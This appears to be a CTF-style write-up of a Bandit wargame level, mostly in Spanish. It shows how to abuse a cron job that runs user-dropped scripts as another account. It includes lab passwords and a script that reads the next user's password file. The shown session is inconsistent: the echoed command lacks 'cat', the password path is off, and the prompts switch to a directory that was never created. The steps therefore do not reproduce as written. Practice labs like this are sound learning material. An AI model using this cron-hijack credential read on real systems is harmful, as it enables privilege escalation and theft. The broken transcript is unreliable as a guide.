# Bandit Level

## Objetivo
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. 

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! 

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around

## Cosas utilies
user: bandit23
password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solucion
``` bash
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls -la
total 48
drwxr-xr-x   2 root root 4096 Sep  1 06:30 .
drwxr-xr-x 110 root root 4096 Sep  8 12:09 ..
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit15_root
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit17_root
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit22
-rw-r--r--   1 root root  122 Sep  1 06:30 cronjob_bandit23
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit24
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit25_root
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rwx------   1 root root   52 Sep  1 06:30 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 23 13:49 .placeholder
-rw-r--r--   1 root root  396 Feb  2  2021 sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done


bandit23@bandit:/etc/cron.d$ mkdir /tmp/mipassword
bandit23@bandit:/etc/cron.d$ echo "/etc/bandit_password/bandit24 >> /tmp/mipassword/pass" > miscript.sh
bandit23@bandit:/tmp/mipass$ chmod 777 miscript.sh
bandit23@bandit:/tmp/mipass$ touch pass
bandit23@bandit:/tmp/mipass$ chmod 666 pass
bandit23@bandit:/tmp/mipass$ chmod -R 777 /tmp/mipassword/
bandit23@bandit:/tmp/mipass$ cp miscript.sh /var/spool/bandit24
bandit23@bandit:/tmp/mipass$ cat pass

VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar



```

## Notas